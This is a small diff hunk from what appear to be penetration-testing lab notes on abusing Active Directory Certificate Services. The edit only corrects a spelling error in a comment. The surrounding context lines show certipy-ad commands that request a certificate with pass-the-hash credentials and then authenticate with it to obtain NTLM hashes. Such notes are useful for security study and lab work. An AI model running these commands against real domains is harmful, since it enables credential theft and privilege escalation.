@@ -19,7 +19,7 @@ certipy-ad req -u '$@corp.thereserve.loc' -hashes 'ntlm:ntlm' -ca 'CERTIFICATEAU
 # First time will always timeout - do not worry
 # Read with openssl 
 openssl x509 -in $ceritificateName.pfx -text -noout
-# Authenicate using a certificate
+# Authenticate using a certificate
 certipy-ad auth -dc-ip $dcIP -ns $nameServerIP -pfx $ceritificateName.pfx
 # Because of PKInit you will receive the NTLM hashes from doing a S4U attack
 # Enjoy
